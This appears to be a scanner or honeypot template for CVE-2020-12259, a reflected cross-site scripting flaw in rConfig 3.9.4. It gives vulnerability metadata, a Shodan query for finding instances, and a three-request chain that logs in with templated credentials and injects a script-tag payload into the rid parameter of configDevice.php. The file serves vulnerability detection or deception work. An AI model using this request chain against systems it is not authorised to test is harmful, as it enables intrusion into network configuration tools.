id: CVE-2020-12259
info:
  name: rConfig 3.9.4 - Cross-Site Scripting
  author: r3Y3r53
  description: 'rConfig 3.9.4 is vulnerable to reflected XSS. The configDevice.php
    file improperly validates user input. An attacker can exploit this vulnerability
    by crafting arbitrary JavaScript in the rid GET parameter of devicemgmnt.php

    '
  severity: medium
  reference:
  - https://www.rconfig.com/downloads/rconfig-3.9.4.zip
  - https://gist.github.com/farid007/8855031bad0e497264e4879efb5bc9f8
  - https://nvd.nist.gov/vuln/detail/CVE-2020-12259
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/Elsfa7-110/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2020-12259
    cwe-id: CWE-79
    epss-score: 0.16256
    epss-percentile: 0.95859
    cpe: cpe:2.3:a:rconfig:rconfig:3.9.4:*:*:*:*:*:*:*
  metadata:
    verified: 'true'
    max-request: 3
    vendor: rconfig
    product: rconfig
    shodan-query: http.title:"rConfig"
  tags: cve2020,cve,rconfig,authenticated,xss
traps:
- request:
    method: GET
    path: /login.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /lib/crud/userprocess.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'user={{username}}&pass={{password}}&sublogin=1

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /configDevice.php?rid="><script>alert(document.domain)</script>
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>rConfig - Configuration Management
